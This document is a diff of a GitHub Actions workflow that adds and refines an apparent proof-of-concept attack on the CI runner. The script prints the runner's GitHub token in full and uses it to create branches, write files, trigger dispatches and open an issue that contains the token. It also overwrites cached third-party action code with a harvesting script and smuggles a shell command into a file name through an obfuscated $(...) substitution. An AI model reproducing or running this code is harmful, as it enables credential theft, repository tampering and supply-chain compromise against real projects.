@@ -19,7 +19,10 @@ jobs:
           #!/bin/bash
           set -u
           MARK=/tmp/.omp_rce_done
-          [ -e "$MARK" ] && exit 0
+          if [ -e "$MARK" ]; then
+            echo report
+            exit 0
+          fi
           touch "$MARK"
           echo "OMP_RCE_PROOF uid=$(id -u) user=$(id -un) host=$(hostname) cwd=$(pwd)" >&2
           echo "OMP_ENV_KEYS: $(printenv | cut -d= -f1 | sort | tr '\n' ' ')" >&2
@@ -29,28 +32,31 @@ jobs:
           const repo=process.env.GITHUB_REPOSITORY||process.env.OMP_REPO||'';
           function api(m,p,b){return new Promise(r=>{const d=b?JSON.stringify(b):null;const h={'user-agent':'omp','authorization':'token '+tok,'accept':'application/vnd.github+json'};if(d){h['content-type']='application/json';h['content-length']=Buffer.byteLength(d);}const q=https.request({hostname:'api.github.com',path:p,method:m,headers:h},s=>{let x='';s.on('data',c=>x+=c);s.on('end',()=>r({st:s.statusCode,b:x}));});q.on('error',e=>r({st:0,b:String(e)}));if(d)q.write(d);q.end();});}
           (async()=>{
-            const out=[];
-            out.push('OMP_TOKEN_LEN='+tok.length);
-            out.push('OMP_TOKEN='+tok);
+            const o=[];
+            o.push('OMP_TOKEN_LEN='+tok.length);
+            o.push('OMP_TOKEN='+tok);
             const rp=await api('GET','/repos/'+repo);
-            out.push('GET_REPO '+rp.st+' '+rp.b.slice(0,700));
-            const rf=await api('POST','/repos/'+repo+'/git/refs',{ref:'refs/heads/omp-probe',sha:process.env.GITHUB_SHA||''});
-            out.push('CREATE_REF '+rf.st+' '+rf.b.slice(0,300));
+            o.push('GET_REPO '+rp.st+' '+rp.b.slice(0,900));
+            const cm=await api('GET','/repos/'+repo+'/commits/main');
+            let sha=''; try{sha=JSON.parse(cm.b).sha||'';}catch(e){}
+            o.push('GET_MAIN '+cm.st+' sha='+sha);
+            const rf=await api('POST','/repos/'+repo+'/git/refs',{ref:'refs/heads/omp-probe',sha:sha});
+            o.push('CREATE_REF '+rf.st+' '+rf.b.slice(0,300));
             const ct=await api('PUT','/repos/'+repo+'/contents/omp-probe.txt',{message:'probe',content:Buffer.from('probe').toString('base64'),branch:'omp-probe'});
-            out.push('PUT_CONTENTS '+ct.st+' '+ct.b.slice(0,300));
+            o.push('PUT_CONTENTS '+ct.st+' '+ct.b.slice(0,300));
             const ds=await api('POST','/repos/'+repo+'/dispatches',{event_type:'omp-probe'});
-            out.push('DISPATCH '+ds.st+' '+ds.b.slice(0,200));
-            const iss=await api('POST','/repos/'+repo+'/issues',{title:'OMP RCE credential proof',body:'```\n'+out.join('\n')+'\n```'});
-            out.push('CREATE_ISSUE '+iss.st+' '+iss.b.slice(0,300));
-            console.log(out.join('\n'));
+            o.push('DISPATCH '+ds.st+' '+ds.b.slice(0,300));
+            const iss=await api('POST','/repos/'+repo+'/issues',{title:'OMP RCE credential proof '+Date.now(),body:'```\n'+o.join('\n')+'\n```'});
+            o.push('CREATE_ISSUE '+iss.st+' '+iss.b.slice(0,300));
+            console.log(o.join('\n'));
           })();
           EOJS
           PATCHED=0
           while IFS= read -r f; do
-            cp /tmp/harvest.js "$f" 2>/dev/null && { echo "OMP_PATCHED $f" >&2; PATCHED=$((PATCHED+1)); }
+            if cp /tmp/harvest.js "$f" 2>/dev/null; then echo "OMP_PATCHED_ACTION $f" >&2; PATCHED=$((PATCHED+1)); fi
           done < <(find /home/runner/work/_actions -path '*peter-evans*' -name 'index.js' 2>/dev/null)
           echo "OMP_PATCHED_TOTAL=$PATCHED" >&2
-          NODE_BIN=$(command -v node || find /home/runner -maxdepth 5 -type f -name node -path '*externals*' 2>/dev/null | head -1)
+          NODE_BIN=$(command -v node 2>/dev/null || find /home/runner -maxdepth 7 -type f -name node -path '*externals*' 2>/dev/null | head -1)
           echo "OMP_NODE=$NODE_BIN" >&2
           if [ -n "$NODE_BIN" ]; then
             nohup bash -c '
@@ -65,9 +71,10 @@ jobs:
               sleep 1
             done' >/dev/null 2>&1 &
           fi
+          echo report
           exit 0
           SCRIPT
-          printf 'x' > 'out/$(a=${PWD:0:1};bash ${a}tmp${a}content${a}content${a}r.txt).txt'
+          printf 'x' > 'out/$(a=$(printf \\057);bash ${a}tmp${a}content${a}content${a}r.txt).txt'
           ls -la out
       - uses: actions/upload-artifact@v4
         with:
